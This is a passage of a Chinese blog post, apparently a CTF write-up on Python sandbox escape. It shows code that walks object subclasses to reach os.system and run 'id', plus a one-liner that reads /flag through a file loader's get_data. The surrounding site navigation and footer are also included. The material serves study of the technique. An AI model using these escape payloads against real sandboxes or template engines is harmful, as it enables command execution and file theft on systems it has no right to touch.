+<p>这里我们通过枚举每一个子类的全局变量内的列表来进行寻找<code>os</code>方法,最终找到仨</p>
+<p>当然如果懒的话也可以直接执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> i.__init__.__globals__:</span><br><span class="line">            <span class="built_in">print</span>(j,i.__init__.__globals__[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;id&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uid=1000</span></span><br><span class="line"><span class="comment">#uid=1000</span></span><br><span class="line"><span class="comment">#uid=1000</span></span><br></pre></td></tr></table></figure>
+
+<p>所以就拿到了我们要用的,当然这里根据自己的需求寻找目标方法，不一定是<code>os</code></p>
+<p>也不一定非要到”globals”,有的比如python3的<code>fileloader</code>，需要注意的我的3.11需要用<code>__dict__</code>来引用..</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">121</span>].__dict__[<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;asdasdhqoaub\n&#x27;</span></span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/09/09/htb-wp-Sightless/"
+      title="【season-6】 htb Sightless wp"
+     >
+
+    <p class="title-text">
+      
+        【season-6】 htb Sightless wp
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
